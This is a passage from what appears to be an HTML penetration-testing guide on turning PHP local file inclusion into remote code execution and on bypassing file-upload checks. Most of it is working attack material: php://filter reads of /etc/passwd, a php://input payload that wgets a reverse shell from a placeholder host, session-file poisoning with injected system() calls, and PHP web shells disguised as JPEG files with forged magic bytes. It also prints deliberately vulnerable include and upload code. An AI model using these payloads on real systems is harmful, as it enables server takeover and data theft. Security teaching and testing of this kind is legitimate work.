+<p class="first admonition-title">Note</p>
+<p class="last">Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don’t have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.</p>
+</div>
+<div class="section" id="filtering-in-lfi">
+<h4>Filtering in LFI<a class="headerlink" href="#filtering-in-lfi" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly.</p>
+<p>For example: the below code only includes the file which are named secret</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
+  $file = @$_GET[&#39;filname&#39;];
+  if(strlen($file) &gt; 55)
+     exit(&quot;File name too long.&quot;);
+  $fileName = basename($file);
+  if(!strpos($file, &quot;secret&quot;))
+    exit(&quot;No secret is selected.&quot;);
+  echo &quot;&lt;pre&gt;&quot;;
+  include($file);
+  echo &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="lfi-to-remote-code-execution">
+<h3>LFI to Remote Code Execution<a class="headerlink" href="#lfi-to-remote-code-execution" title="Permalink to this headline">¶</a></h3>
+<p>Mainly taken from <a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI-Cheat-Sheet</a> , <a class="reference external" href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">Exploiting PHP File Inclusion – Overview</a> and <a class="reference external" href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></p>
+<p>There are variety of different tricks to turn your LFI into RCE. Using</p>
+<div class="section" id="file-upload-forms-functions">
+<h4>File upload forms/ functions<a class="headerlink" href="#file-upload-forms-functions" title="Permalink to this headline">¶</a></h4>
+<p>Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.</p>
+</div>
+<div class="section" id="php-wrapper-expect-command">
+<h4>PHP wrapper expect://command<a class="headerlink" href="#php-wrapper-expect-command" title="Permalink to this headline">¶</a></h4>
+<p>Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.</p>
+<p>An example of PHP expect:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=expect://ls
+</pre></div>
+</div>
+<p>If PHP expect wrapper is disabled, below error is encountered.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Warning: include(): Unable to find the wrapper &quot;expect&quot; - did you forget to enable it when you&lt;br&gt; configured PHP? in /var/www/fileincl/example1.php on line 7
+Warning: include(): Unable to find the&lt;br&gt; wrapper &quot;expect&quot; - did you forget to enable it when you configured PHP? in &lt;br&gt; /var/www/fileincl/example1.php on line 7
+Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7
+Warning: include(): Failed opening &#39;expect://ls&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /var/www/fileincl/example1.php on line 7
+</pre></div>
+</div>
+</div>
+<div class="section" id="php-wrapper-php-file">
+<h4>PHP wrapper php://file<a class="headerlink" href="#php-wrapper-php-file" title="Permalink to this headline">¶</a></h4>
+</div>
+<div class="section" id="php-wrapper-php-filter">
+<h4>PHP wrapper php://filter<a class="headerlink" href="#php-wrapper-php-filter" title="Permalink to this headline">¶</a></h4>
+<p>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.</p>
+<p>The output is encoded using base64, so you’ll need to decode the output.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+</pre></div>
+</div>
+<p>or</p>
+<p>We could use php filter to read the source code of a PHP File</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+</pre></div>
+</div>
+<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
+</div>
+<div class="section" id="php-input-stream">
+<h4>PHP input:// stream<a class="headerlink" href="#php-input-stream" title="Permalink to this headline">¶</a></h4>
+<p>php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.</p>
+<p>Send your payload in the POST request using curl, burp.</p>
+<p>Example:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://input
+</pre></div>
+</div>
+<p>Post Data payload:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;? system(&#39;wget http://IP/php-reverse-shell.php -O /var/www/shell.php&#39;);?&gt;
+</pre></div>
+</div>
+<p>After uploading execute the reverse shell at</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/shell.php
+</pre></div>
+</div>
+</div>
+<div class="section" id="data-text-plain-base64-command">
+<h4><a class="reference external" href="data://text/plain;base64,command">data://text/plain;base64,command</a><a class="headerlink" href="#data-text-plain-base64-command" title="Permalink to this headline">¶</a></h4>
+</div>
+<div class="section" id="proc-self-environ">
+<h4>/proc/self/environ<a class="headerlink" href="#proc-self-environ" title="Permalink to this headline">¶</a></h4>
+<p>If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.</p>
+</div>
+<div class="section" id="proc-self-fd">
+<h4>/proc/self/fd<a class="headerlink" href="#proc-self-fd" title="Permalink to this headline">¶</a></h4>
+<p>If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.</p>
+<p>This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc.
+Utilize <a class="reference external" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt">LFI-LogFileCheck.txt</a> with Burp Intruder, and check for the returned page sizes.</p>
+</div>
+<div class="section" id="control-over-php-session-values">
+<h4>Control over PHP Session Values<a class="headerlink" href="#control-over-php-session-values" title="Permalink to this headline">¶</a></h4>
+<p>Let’s say, a vulnerable page is present with the post request</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+Content-Length: 44
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=admin&amp;pass=admin&amp;lang=en_us.php
+</pre></div>
+</div>
+<p>with LFI</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>login=1&amp;user=admin&amp;pass=admin&amp;lang=../../../../../../../../../../etc/passwd
+</pre></div>
+</div>
+<p>Now, the server store cookies</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+</pre></div>
+</div>
+<p>As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27</p>
+<p>Now, we can write the cookie with a php command</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+Content-Length: 134
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;&amp;pass=password&amp;lang=en_us.php
+</pre></div>
+</div>
+<p>This would result in</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly
+</pre></div>
+</div>
+<p>Now, the php command can be executed using</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+</pre></div>
+</div>
+<p>The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)</p>
+</div>
+<div class="section" id="email-server">
+<h4>Email Server<a class="headerlink" href="#email-server" title="Permalink to this headline">¶</a></h4>
+</div>
+</div>
+</div>
+<div class="section" id="appendix-ii-file-upload">
+<h2>Appendix-II File Upload<a class="headerlink" href="#appendix-ii-file-upload" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="examples">
+<h3>Examples<a class="headerlink" href="#examples" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="simple-file-upload">
+<h4>Simple File Upload<a class="headerlink" href="#simple-file-upload" title="Permalink to this headline">¶</a></h4>
+<p>Intercepting the request in Burp/ ZAP and changing the file-extension.</p>
+<p>Below is the PHP code</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?
+
+function genRandomString() {
+  $length = 10;
+  $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
+  $string = &quot;&quot;;
+
+  for ($p = 0; $p &lt; $length; $p++) {
+      $string .= $characters[mt_rand(0, strlen($characters)-1)];
+  }
+
+  return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+  do {
+  $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
+  } while(file_exists($path));
+  return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+  $ext = pathinfo($fn, PATHINFO_EXTENSION);
+  return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists(&quot;filename&quot;, $_POST)) {
+  $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);
+
+
+      if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
+      echo &quot;File is too big&quot;;
+  } else {
+      if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
+          echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
+      } else{
+          echo &quot;There was an error uploading the file, please try again!&quot;;
+      }
+  }
+} else {
+?&gt;
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
+Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+</pre></div>
+</div>
+<p>If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.</p>
+<ul>
+<li><p class="first">Create a fake JPG containing php code.</p>
+<p>We’ll be using system() to read our password.</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&quot; &gt; shell.jpg
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Upload JPG, intercept in Burp/ ZAP and change the extension</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span> &lt;input name=&quot;filename&quot; value=&quot;o0xn5q93si.jpg&quot; type=&quot;hidden&quot;&gt;
+
+is changed to
+</pre></div>
+</div>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;input name=&quot;filename&quot; value=&quot;o0xn5q93si.php&quot; type=&quot;hidden&quot;&gt;
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="simple-file-upload-with-verifying-image-type">
+<h4>Simple File Upload - With verifying image type<a class="headerlink" href="#simple-file-upload-with-verifying-image-type" title="Permalink to this headline">¶</a></h4>
+<p>In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
+...
+
+else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {
+      echo &quot;File is not an image&quot;;
+  }
+
+...
+
+?&gt;
+</pre></div>
+</div>
+<p>Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a “Magic Number” at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.</p>
+<ul class="simple">
+<li>Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let’s say first 100 bytes)</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>hexdump -n 100 -e &#39;100/1 &quot;\\x%02X&quot; &quot;\n&quot;&#39; sunflower.jpg
+
+-n length         : Interpret only length bytes of Input
+-e format_string  : Specify a format string to be used for displaying data
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>hexdump -n 100 -e &#39;100/1 &quot;\\x%02X&quot; &quot;\n&quot;&#39; sunflower.jpg
+\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Create a file with JPG header and command shell code using python</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&gt;&gt;&gt; fh = open(&#39;shell.php&#39;,&#39;w&#39;)
+&gt;&gt;&gt; fh.write(&#39;The Hexdump from above \xFF\xD8\xFF\xE0&#39; + &#39;&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;)
+&gt;&gt;&gt; fh.close()
+</pre></div>
+</div>
+</li>
+</ul>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">Do check the source code of the page for any client-side file validation or any commented hidden parameters?</p>
+</div>
+</div>
+</div>
 </div>
 </div>
 
